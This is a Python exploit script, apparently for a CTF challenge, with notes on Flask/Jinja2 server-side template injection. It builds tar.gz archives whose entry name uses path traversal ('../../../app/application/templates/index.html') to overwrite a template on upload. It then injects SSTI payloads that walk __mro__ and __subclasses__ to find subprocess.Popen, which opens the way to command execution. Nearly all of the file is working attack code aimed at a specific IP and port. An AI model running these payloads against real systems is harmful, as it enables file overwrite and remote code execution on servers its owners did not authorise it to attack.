# Notes from https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
# In SSTI, MRO stands for Method Resolution Order...
# - This is basically a tuple of classes that are referenced when looking for a base class during method resolution
# - The __mro__ attribute consists of the object's inheritance map in a tuple consisting of the class, it's base,
#   its base's bases base, etc...
#
# - Overyly simplified, __mro__ allows us to go back up the tree of inherited objects in the current Python environment,
#   and __subclasses__ lets us come back down
#
# Syntax often like...  {{''.__class__.__mro__[1].__subclasses__()}}
#
# What does the b mean in front of a string literal?
#    - See: https://stackoverflow.com/questions/6269765/what-does-the-b-character-do-in-front-of-a-string-literal
#

import io
import requests
import time
import tarfile
import html
import ast

url = "http://157.245.46.136:31355"
name = "../../../../../../../../../../app/application/templates/index.html"




# Refactor this to be a function
# Comment this code better as we'll likely want to reuse it at some point

#
#
#
def createTarGzFh(data):
    source_f = io.BytesIO(initial_bytes=data)

    fh = io.BytesIO()
    with tarfile.open(fileobj=fh, mode="w:gz") as tar:
        info = tarfile.TarInfo(name)
        info.size = len(data)
        info.mtime = time.time()
        tar.addfile(info, source_f)

    with open("test.tar.gz", "wb") as f:
        f.write(fh.getvalue())

    return fh

initialData = b"""
{{''.__class__.__mro__[1].__subclasses__()}}
"""
myFh = createTarGzFh(initialData)

s = requests.Session()
r = requests.post(url + "/api/unslippy", files={"file": myFh.getvalue()})

print(r.text)
print(s.get(url).text)


# Challenge is that when we inject the SSTI payload to view all classes, the response the server sends back is
# HTML Entity encoded
#
# ie... looks like
#     [&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;,
#
# What we want to see is...
#     [<class 'type'>, <class 'async_generator'>,
#
# To get this, we want to unescape the returned text... then we want to load this as a list so we can get the class we
# need ...
#
# https://docs.python.org/3/library/html.html#html.unescape
#
r = requests.get(url + "/")
raw_content_list = str(html.unescape(r.text))
# sloppy way to strip out the first and last square brackets...
# [<class 'type'>, <class 'async_generator'>, <class 'int'>] -> <class 'type'>, <class 'async_generator'>, <class 'int'>
content_list = raw_content_list[1:-1]

class_list = content_list.split(",")



#print("class_list[1]" + str(class_list[1]))

# Find the index of a class we care about - ie... <class 'subprocess.Popen'>
# Note the dumb space at the beginning...
popenIndex = class_list.index(''' <class 'subprocess.Popen'>''')
print("Popen index == " + str(popenIndex))

# Remember when creating these strings that we don't have the context of what subprocess.PIPE is due to... ()
stage2Data = b"""
{{''.__class__.__mro__[1].__subclasses__()[""" + str.encode(str(popenIndex)) + b"""]}}
"""

myFh = createTarGzFh(stage2Data)

#s = requests.Session()
r = requests.post(url + "/api/unslippy", files={"file": myFh.getvalue()})

print(r.text)
print(s.get(url).text)



#for currClass in class_list:
#    print("-"+currClass + "-" + "\n")

# Dumb Code...


# Letting ast module parse our list in "string" form
#converted_list = ast.literal_eval(content_list)str[1:-1]

# Now we should be able to work with it as a list
#print("converted_list " + str(type(converted_list)))
#print(converted_list[2])

#print(content_list)
#print(content_list[1])



# See PyCharm help at https://www.jetbrains.com/help/pycharm/
